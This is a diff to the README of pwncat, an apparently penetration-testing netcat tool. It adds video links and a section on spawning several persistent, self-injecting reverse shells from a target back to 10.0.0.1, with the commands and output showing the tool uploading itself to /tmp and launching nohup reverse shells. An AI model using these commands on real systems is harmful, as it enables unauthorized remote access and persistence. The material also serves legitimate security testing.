@@ -698,10 +698,15 @@ pwncat --exec /bin/bash --nodns --udp --ping-intvl 2 10.0.0.1 4444
 ```
 
 ### Self-injecting reverse shell
+
 Let's imagine you are able to create a very simple and unstable reverse shell from the target to
 your machine, such as a web shell via a PHP script or similar.
 Knowing, that this will not persist very long or might break due to unstable network connection,
 you could use `pwncat` to hook into this connection and deploy itself unbreakably on the target - fully automated.
+
+<a href="https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s"><img width="400" style="width:400px;" src="docs/img/video01.png" /></a>
+
+> [View on Youtube](https://www.youtube.com/watch?v=lN10hgl_Ts8&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2&t=0s)
 
 All you have to do, is use `pwncat` as your local listener and start it with the `--self-inject`
 switch. As soon as the client (e.g.: the reverse web shell) connects to it, it will do a couple of things:
@@ -759,6 +764,57 @@ ncat -l 4445
 pwncat -l 4445
 ```
 
+### Unlimited self-injecting reverse shells
+
+Instead of just asking for a single self-injecting reverse shell, you can instruct `pwncat` to spawn as many unbreakable reverse shells connecting back to you as you desire.
+
+<a href="https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2"><img width="400" style="width:400px;" src="docs/img/video02.png" /></a>
+
+> [View on Youtube](https://www.youtube.com/watch?v=VQyFoUG18WY&list=PLT1I2bH6BKxj2qEylDdEns39ej8g3_eMc&index=2")
+
+The `--self-inject` argument allows you to not only define a single port, but also
+
+1. A comma separated list of ports: `4445,4446,4447,4448`
+2. A range definition: `4446-4448`
+3. An increment: `4445+3`
+
+In order to spawn 4 reverse shells you would start your listener just as described above, but instead
+of a single port, you define multiple:
+
+```bash
+# Comma separated
+pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445,4446,4447,4448
+
+# Range
+pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445-4448
+
+# Increment
+pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445+3
+```
+Each of the above three commands will achieve the same behaviour: spawning 4 reverse shells inside the target.
+Once the client connects, the output will look something like this:
+
+```
+[PWNCAT CnC] Probing for: /bin/python
+[PWNCAT CnC] Probing for: /bin/python2
+[PWNCAT CnC] Probing for: /bin/python2.7
+[PWNCAT CnC] Probing for: /bin/python3
+[PWNCAT CnC] Probing for: /bin/python3.5
+[PWNCAT CnC] Probing for: /bin/python3.6
+[PWNCAT CnC] Probing for: /bin/python3.7
+[PWNCAT CnC] Probing for: /bin/python3.8
+[PWNCAT CnC] Probing for: /usr/bin/python
+[PWNCAT CnC] Potential path: /usr/bin/python
+[PWNCAT CnC] Found valid Python2 version: 2.7.16
+[PWNCAT CnC] Creating tmpfile: /tmp/tmp3CJ8Us
+[PWNCAT CnC] Creating tmpfile: /tmp/tmpgHg7YT
+[PWNCAT CnC] Uploading: /home/cytopia/tmp/pwncat/bin/pwncat -> /tmp/tmpgHg7YT (3422/3422)
+[PWNCAT CnC] Decoding: /tmp/tmpgHg7YT -> /tmp/tmp3CJ8Us
+Starting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4445 &
+Starting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4446 &
+Starting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4447 &
+Starting pwncat rev shell: nohup /usr/bin/python /tmp/tmp3CJ8Us --exec /bin/bash --reconn --reconn-wait 1 10.0.0.1 4448 &
+```
 
 ### Logging
 
